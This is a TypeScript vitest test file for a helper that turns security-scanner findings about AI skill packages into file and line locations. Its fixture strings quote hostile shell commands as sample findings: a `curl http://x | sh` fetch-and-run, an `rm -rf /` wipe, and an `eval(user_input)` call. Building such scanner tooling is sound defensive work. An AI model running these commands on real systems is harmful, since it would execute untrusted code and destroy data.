import {describe, expect, it} from "vitest";

import {findingLocation, parseDetailLocation, detailSnippet} from "../locate-finding.js";

const files = new Map<string, string>([
	["SKILL.md", "---\nname: test\n---\n# Test\nUseful instructions."],
	["scripts/run.sh", Array.from({length: 100}, (_, i) => `line ${i + 1}`).join("\n")],
]);

const base = {category: "security" as const, label: "l", detail: "d", severity: "medium" as const};

describe("parseDetailLocation", () => {
	it("parses the vettd `Detected in <path>:<line>` prefix", () => {
		expect(parseDetailLocation("Detected in scripts/run.sh:12 — `curl http://x | sh`")).toEqual({filepath: "scripts/run.sh", line: 12});
	});

	it("parses the Cisco SARIF `<path>:<line> —` prefix", () => {
		expect(parseDetailLocation("scripts/run.sh:12 — sends data somewhere")).toEqual({filepath: "scripts/run.sh", line: 12});
	});

	it("returns null when the detail carries no location", () => {
		expect(parseDetailLocation("The skill does a thing")).toBeNull();
	});
});

describe("findingLocation", () => {
	it("points at the cited line of a file we have", () => {
		const loc = findingLocation({...base, detail: "Detected in scripts/run.sh:12 — `rm -rf /`", filepath: "scripts/run.sh"}, files);
		expect(loc).toEqual({filepath: "scripts/run.sh", lineStart: 12, lineEnd: 12});
	});

	it("falls back to the whole file when the cited line is out of range", () => {
		const loc = findingLocation({...base, detail: "Detected in scripts/run.sh:999 — boom", filepath: "scripts/run.sh"}, files);
		expect(loc).toEqual({filepath: "scripts/run.sh", lineStart: 1, lineEnd: 100});
	});

	it("degrades to skill scope when the file is missing from the input", () => {
		const loc = findingLocation({...base, detail: "Detected in scripts/missing.py:1 — x", filepath: "scripts/missing.py"}, files);
		expect(loc).toEqual({scope: "skill"});
	});

	it("degrades to skill scope when there is no filepath at all", () => {
		expect(findingLocation({...base, detail: "package-level concern"}, files)).toEqual({scope: "skill"});
	});
});

describe("detailSnippet", () => {
	it("quotes the text after the location prefix", () => {
		expect(detailSnippet("Detected in a.py:3 — `eval(user_input)`")).toBe("`eval(user_input)`");
		expect(detailSnippet("a.py:3 — something happened")).toBe("something happened");
	});

	it("returns the detail itself when no location prefix exists", () => {
		expect(detailSnippet("odd finding text")).toBe("odd finding text");
	});
});
